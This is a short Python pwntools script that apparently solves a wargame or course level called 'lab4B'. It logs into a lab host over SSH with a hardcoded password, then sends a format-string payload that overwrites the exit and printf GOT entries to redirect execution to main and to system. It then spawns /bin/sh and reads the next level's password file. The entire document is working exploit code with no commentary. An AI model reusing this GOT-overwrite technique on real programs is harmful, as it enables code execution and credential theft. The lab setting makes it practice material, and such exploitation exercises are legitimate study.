from pwn import *

s = ssh(host = '192.168.147.134', user = 'lab4B', password = 'bu7_1t_w4sn7_brUt3_f0rc34b1e!')

r = s.process("/levels/lab04/lab4B")
exit_got = 0x80499b8
system = 0xb7e63190
sys1 = system & 0xffff
sys2 = system >> 16
shellcode_addr = 0xbffff680
printf_got = 0x80499ac
main = 0x804868d
vl1 = main & 0xffff
vl2 = main >> 16
payload = p32(exit_got)
payload += p32(exit_got + 2)
payload += p32(printf_got)
payload += p32(printf_got + 2)
payload += f"%{vl2 - 16}c%7$hn".encode()
payload += f"%{vl1 - vl2}c%6$hn".encode() # overwrite exit_got to main
payload += f"%{(sys1 - vl1) & 0xffff}c%8$hn".encode()
payload += f"%{(sys2 - sys1)}c%9$hn".encode() # overwrite printf_got to system
r.sendline(payload)
sleep(1)
r.sendline(b'/bin/sh\x00') # system("/bin/sh")
r.sendline(b'cat /home/lab4A/.pass')
r.interactive()

